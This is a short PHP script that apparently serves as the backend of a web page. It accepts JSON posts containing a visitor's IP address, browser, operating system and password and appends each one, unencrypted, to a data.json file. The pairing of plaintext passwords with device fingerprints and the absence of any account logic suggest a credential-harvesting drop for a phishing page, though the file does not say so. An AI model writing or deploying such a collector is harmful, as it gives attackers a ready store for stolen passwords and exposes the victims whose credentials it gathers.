<?php
$data = file_get_contents("php://input");
$jsonData = json_decode($data, true);
$filePath = 'data.json';


if (!isset($jsonData['ip'], $jsonData['browser'], $jsonData['os'], $jsonData['password'])) {
    http_response_code(400);
    echo json_encode(['message' => 'Invalid data']);
    exit;
}


$existingData = [];
if (file_exists($filePath)) {
    $existingData = json_decode(file_get_contents($filePath), true);
}

$existingData[] = $jsonData;

file_put_contents($filePath, json_encode($existingData, JSON_PRETTY_PRINT));

// Respond with a success message
header('Content-Type: application/json');
echo json_encode(['message' => 'Data saved successfully!']);
?>

